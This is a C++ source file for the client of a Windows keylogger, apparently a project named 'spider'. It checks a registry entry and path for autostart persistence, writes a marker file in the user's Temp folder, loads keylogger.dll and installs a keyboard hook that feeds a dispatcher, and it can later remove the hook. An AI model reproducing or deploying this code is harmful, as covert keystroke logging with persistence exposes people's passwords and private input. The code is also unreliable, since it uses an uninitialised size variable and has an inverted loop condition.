#include "ClientLogger.hpp"

ClientLogger::ClientLogger()
	: _quit(false), _hDll(NULL)
{

}

ClientLogger::~ClientLogger()
{

}

bool	ClientLogger::init(const char *name)
{
	AutoStart start(name);
	hook ptrHook = NULL;
	HANDLE file;
	char username[UNLEN + 1];
	DWORD size;

	SetLastError(0);

	start.verifyPath();
	start.verifyRegister();

	if (GetUserName(username, &size) == 0)
		return (false);

	_filePath.append("C:\\Users\\");
	_filePath.append(username);
	_filePath.append("\\AppData\\Local\\Temp\\spider");

	if ((file = CreateFile(_filePath.c_str(), GENERIC_WRITE, 0, NULL,
		CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
		return (false);

	if ((_hDll = LoadLibrary("keylogger.dll")) == NULL
		|| (ptrHook = (hook)GetProcAddress(_hDll, "SetHook")) == NULL)
		return (false);

	_disp = std::shared_ptr<Dispatcher>(new Dispatcher);

	if (ptrHook(_disp) == false)
		return (false);
	return (true);
}

void	ClientLogger::run()
{
	MSG msg;

	while (_quit)
	{
		while (GetMessage(&msg, NULL, 0, 0))
		{
			if (msg.message == WM_QUIT || msg.message == WM_DESTROY || msg.message == WM_CLOSE)
				_quit = false;
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
	if (!unset())
	{
		std::cerr << GetLastError() << std::endl;
		Sleep(1000);
	}
}

bool	ClientLogger::unset()
{
	pFunc ptrFunc = NULL;

	DeleteFile(_filePath.c_str());
	if ((ptrFunc = (pFunc)GetProcAddress(_hDll, "RemoveHook")) == NULL)
	{
		std::cerr << GetLastError() << std::endl;
		return (false);
	}
	ptrFunc();
	FreeLibrary(_hDll);
	return (true);
}